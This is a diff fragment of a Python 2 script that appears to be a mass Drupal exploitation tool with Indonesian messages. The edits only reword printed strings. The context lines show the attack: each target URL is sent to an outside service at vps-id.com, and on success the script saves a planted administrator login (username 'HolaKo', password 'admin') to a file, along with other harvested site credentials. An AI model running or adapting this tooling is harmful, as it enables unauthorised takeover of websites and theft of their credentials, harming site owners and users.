@@ -74,7 +74,7 @@ def drupal():
                            a.write(situs+'\n')
                            a.write("user:"+user+"\npass:"+pwd+"\n")
                         else :
-                           print "[-] Expl Not Found :( "
+                           print "[!] Exploit Tidak Ditemukan :( "
  
         except Exception as ex :
                        print ex
@@ -113,13 +113,13 @@ def drupallist():
                         openurl = urllib2.urlopen('http://vps-id.com/DRUPAL/?url='+url+'&submit=submit')
                         readcontent = openurl.read()
                         if  "Success" in readcontent :
-                                print "[+]Success =>"+url
+                                print "[+]Success -->"+url
                                 print "[-]username:HolaKo\n[-]password:admin"
                                 save = open('drupal.txt','a')
                                 save.write(url+"\n"+"[-]username:HolaKo\n[-]password:admin\n")
                                
                         else :
-                                print i + "=> Exploit tak Ditemukan :( "
+                                print i + "--> Exploit tak Ditemukan :( "
                 except Exception as ex :
                                 print ex
  
